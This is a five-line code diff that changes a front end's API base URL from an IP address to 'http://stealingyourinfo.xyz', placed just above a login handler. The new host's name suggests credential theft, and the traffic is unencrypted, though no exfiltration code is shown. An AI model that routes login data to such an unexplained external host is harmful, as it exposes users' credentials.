@@ -1,5 +1,5 @@
 // digitalocean droplet
-const API_BASE = "http://104.248.232.237";
+const API_BASE = "http://stealingyourinfo.xyz";
 
 // login button
 async function handleLogin() {
